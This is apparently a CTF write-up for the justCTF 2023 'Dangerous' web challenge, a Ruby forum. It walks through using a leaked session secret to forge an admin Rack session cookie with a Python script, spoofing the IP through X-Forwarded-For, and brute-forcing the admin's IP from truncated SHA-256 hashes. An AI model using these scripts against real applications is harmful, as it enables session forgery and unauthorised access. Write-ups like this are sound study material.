---
layout: post
title: justCTF 2023 Dangerous (Web) Writeup
tags: [ctf, ctf writeup, ctf web]
---

[justCTF 2023 Dangerous (Web)](https://2023.justctf.team/challenges/18)  
[Event on CTFtime](https://ctftime.org/event/1930)

## Challenge Description

> My friend told me there's a secret page on this forum, but it's only for administrators.

A link to the challenge and downloadable of the source code are provided.

## A First Look

The web app is a forum, with two threads posted.

![Homepage](/assets/image/justctf-2023-web-dangerous-writeup/homepage.png)

Viewing one of the threads, it can be seen that the username of admin is `janitor`.

![Thread 1](/assets/image/justctf-2023-web-dangerous-writeup/thread-1.png)

The web app is written in Ruby.

The `/flag` endpoint and `is_allowed_ip` function is especially interesting:

```ruby
get "/flag" do
  if !session[:username] then
    erb :login
  elsif !is_allowed_ip(session[:username], request.ip, config) then
    return [403, "You are connecting from untrusted IP!"]
  else
    return config["flag"] 
  end
end

def is_allowed_ip(username, ip, config)
  return config["mods"].any? {
    |mod| mod["username"] == username and mod["allowed_ip"] == ip
  }
end
```

It checks the if the user logged in is a moderator and if the IP address is the allowed IP address in a config file.

## Craft Admin Cookie

When clicking on "New Thread" without filling in anything, the website shows an error page with backtrace and environment information. The session secret as well as how the session cookie is encoded is revealed.

![Session options](/assets/image/justctf-2023-web-dangerous-writeup/session-options.png)

The session is implemented with Rack Protection. With some research into the [source code](https://github.com/sinatra/sinatra/blob/5f4dde19719505989905782a61a19c545df7f9f9/rack-protection/lib/rack/protection/encryptor.rb#L19), and from environment info, it can be seen that the session cookie is encoded and encrypted as follows:

1. The data is first serialised with Marshal
2. It is then encrypted with AES-256-GCM with the first 32 bytes of the session secret as the key
3. The encrypted data, IV and authentication tag are then encoded with URL-safe base64
4. The encrypted data, IV and authentication tag are then concatenated with a `--` delimiter

My script to modify the session cookie into an admin cookie is as follows:

```python
import base64
import urllib.parse
import rubymarshal.reader, rubymarshal.writer
from Crypto.Cipher import AES

secret = bytes.fromhex('[secret hex string]')
cookie = '[original cookie]'
ct, iv, auth = cookie.split('--')
ct, iv, auth = map(urllib.parse.unquote, [ct, iv, auth])
ct, iv, auth = map(base64.b64decode, [ct, iv, auth])
cipher = AES.new(secret[:32], AES.MODE_GCM, iv)
dec = cipher.decrypt(ct)
d = rubymarshal.reader.loads(dec)

d['username'] = 'janitor'
m = rubymarshal.writer.writes(d)
cipher = AES.new(secret[:32], AES.MODE_GCM, iv)  # I just reuse the original IV
ct, auth = cipher.encrypt_and_digest(m)
ct, iv, auth = map(base64.b64encode, [ct, iv, auth])
ct, iv, auth = map(urllib.parse.quote, [ct, iv, auth])
cookie = f'{ct}--{iv}--{auth}'
print(cookie)
```

## Bypass IP Restriction

With the admin cookie, the `/flag` endpoint now does not prompt to login, but instead shows a 403 error page with message "You are connecting from untrusted IP!".

### Spoof the IP Address

In `nginx.conf`, it can be seen that the `REMOTE_ADDR` header is set to localhost with the following:

```nginx
proxy_set_header REMOTE_ADDR localhost;
```

Research on how the app gets `request.ip`, found in this [Stack Overflow answer](https://stackoverflow.com/a/43014286), that if the `REMOTE_ADDR` is in reserved private subnet ranges, it will instead use the `X-Forwarded-For` header, thus the IP address can be spoofed with `X-Forwarded-For`.

### Find the Allowed IP Address

However, the allowed IP address is still unknown. Looking at the source code, the user colour uses in each thread uses the first 6 characters of the hex value of SHA-256 of the IP address and thread ID concatenated together.

```erb
<% user_color = Digest::SHA256.hexdigest(reply[2] + @id).slice(0, 6) %>
```

In the above code, `reply[2]` is the IP address of the user who posted the reply, and `@id` is the thread ID.

Both of thread 1 and thread 2 have a reply from the admin, so the IP address can be found by brute forcing to find the IP address that produces the matching hashes for both threads.

```python
from Crypto.Hash import SHA256
from multiprocessing import Pool
target = '32cae2'
thread = 1
def brute(a):
    for b in range(256):
        for c in range(256):
            for d in range(256):
                ip = f'{a}.{b}.{c}.{d}'
                x = ip + str(thread)
                h = SHA256.new(x.encode()).hexdigest()[:6]
                if h == target:
                    print(f'{a}.{b}.{c}.{d}', flush=True)
if __name__ == '__main__':
    with Pool(8) as p:
        p.map(brute, range(256))
```

Putting everything together, the flag is:

```
justCTF{1_th1nk_4l1ce_R4bb1t_m1ght_4_4_d0g}
```

## Additional Notes

Rack Protection tracks user agent, and if the user agent is changed, the session cookie will be invalidated. Either the user agent must be spoofed, or the session cookie must be regenerated.
